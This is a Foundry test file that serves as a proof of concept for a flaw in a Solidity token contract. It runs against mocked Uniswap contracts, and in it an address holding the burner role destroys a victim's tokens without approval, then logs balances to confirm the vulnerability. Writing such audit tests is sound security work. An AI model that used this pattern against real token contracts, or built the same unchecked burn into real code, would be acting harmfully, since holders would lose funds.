// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SecondToken.sol";

contract BurnTokenTest is Test {
    SecondToken token;
    address admin = vm.addr(1);
    address victim = vm.addr(2);
    address attacker = vm.addr(3);
    
    uint256 constant VICTIM_BALANCE = 1000 ether;
    uint256 constant BURN_AMOUNT = 500 ether;
    
    // Mock contracts implemented below
    MockRouter router;
    MockFactory factory;
    MockPair pair;

    function setUp() public {
        vm.startPrank(admin);
        
        // Deploy full mock ecosystem
        pair = new MockPair();
        factory = new MockFactory(address(pair));
        router = new MockRouter(address(factory));
        
        // Deploy token with mock ecosystem
        token = new SecondToken(address(router), admin);
        
        // Grant roles
        bytes32 burnerRole = token.BURNER_ROLE();
        token.grantRole(burnerRole, attacker);
        
        bytes32 minterRole = token.MINTER_ROLE();
        token.grantRole(minterRole, admin);
        
        // Mint tokens to victim
        token.mint(victim, VICTIM_BALANCE);
        vm.stopPrank();
    }

    function testMaliciousBurnAttack() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 preBurnVictimBalance = token.balanceOf(victim);
        uint256 preBurnTotalSupply = token.totalSupply();
        console.log("Victim balance (before):", preBurnVictimBalance);
        console.log("Total supply (before)  :", preBurnTotalSupply);

        console.log("--- Trigger: Attacker burns victim's tokens ---");
        vm.prank(attacker);
        token.burn(victim, BURN_AMOUNT);

        console.log("--- AFTER-Trigger State ---");
        uint256 postBurnVictimBalance = token.balanceOf(victim);
        uint256 postBurnTotalSupply = token.totalSupply();
        console.log("Victim balance (after):", postBurnVictimBalance);
        console.log("Total supply (after)  :", postBurnTotalSupply);
        
        uint256 balanceChange = preBurnVictimBalance - postBurnVictimBalance;
        uint256 supplyChange = preBurnTotalSupply - postBurnTotalSupply;
        
        console.log("Balance change:", balanceChange);
        console.log("Supply change :", supplyChange);
        
        if (balanceChange == BURN_AMOUNT && supplyChange == BURN_AMOUNT) {
            console.log("Vulnerability Exists: Attacker successfully burned victim's tokens without approval");
        } else {
            console.log("Vulnerability not Exist: State change does not match expected burn amount");
        }
    }
}

// Mock Uniswap Router
contract MockRouter {
    address public immutable factory;
    address public immutable WETH;
    
    // Use public state variables - auto generates getter functions
    constructor(address _factory) {
        factory = _factory;
        WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    }
}

// Mock Uniswap Factory
contract MockFactory {
    address private pair;
    
    constructor(address _pair) {
        pair = _pair;
    }
    
    function createPair(address, address) external view returns (address) {
        return pair;
    }
}

// Mock Uniswap Pair
contract MockPair {}